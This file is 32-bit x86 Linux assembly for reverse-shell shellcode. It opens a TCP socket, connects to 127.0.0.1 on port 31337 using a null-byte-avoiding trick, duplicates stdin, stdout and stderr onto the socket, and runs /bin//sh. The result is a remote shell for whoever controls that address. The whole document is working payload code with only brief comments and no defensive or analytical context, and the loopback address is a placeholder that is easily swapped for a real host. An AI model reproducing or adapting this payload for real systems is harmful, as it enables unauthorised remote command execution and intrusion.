BITS 32


; socketcall(int call, unsigned long *args)

; socket(domain, type, protocol)
  push BYTE 0x66;
  pop eax	;
  cdq		; zero out edx
  xor ebx,ebx	; zero ebx
  inc ebx	; socketcall 1 is socket
  push edx	; protocol = 0
  push BYTE 0x1	; type = SOCK_STREAM
  push BYTE 0x2	; domain = AF_INET
  mov ecx, esp	; move argument pointer into ecx
  int 0x80	; perform the syscall (create the socket)
  
  xchg esi, eax ; save the socket fd
  
; connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
  push BYTE 0x66 ;
  pop eax	 ;
  inc ebx	 ; ebx = 2 needed for AF_INET
  push DWORD 0x01AAAA7f; ip address = 127.0.0.1 (network order)
  mov [esp+1], dx; replace the A's with nulls
  push WORD 0x697a	 ; port  network order
  push WORD bx	 ; AF_INET
  mov ecx, esp	 ; sockaddr 
  push BYTE 16 ; 
  push ecx	;
  push esi	;
  mov ecx, esp ;
  inc ebx	; ebx = 3 connect
  int 0x80	; do the syscall connect
  
; dup2( oldfd, newfd)
  xchg esi, ebx;
  xchg ecx, esi;
  dec ecx 	;
 ; xchg eax, esi; 
 ; push BYTE 0x2;
 ; pop ecx;
dup_loop:
  mov BYTE al, 0x3f ; system call for dup 2
  int 0x80	; do the system call
  dec ecx	;
  jns dup_loop	;
  
 
; execve( [/bin//sh], *[/bin//sh, 0], [0]
  mov BYTE al, 11 ; push system call 11 (execve) 
  push edx ; null terminate the string
  push 0x68732f2f ; '//sh' onto stack
  push 0x6e69622f ; '/bin' onto stack	
  mov ebx, esp	  ; pointer for /bin//sh into ebx
  push edx	; null terminate the array
  mov edx, esp ; null array for envp
  push ebx	; push address of string onto stack
  mov ecx, esp  ; array for argv
  int 0x80	; perfrom the call!
  
  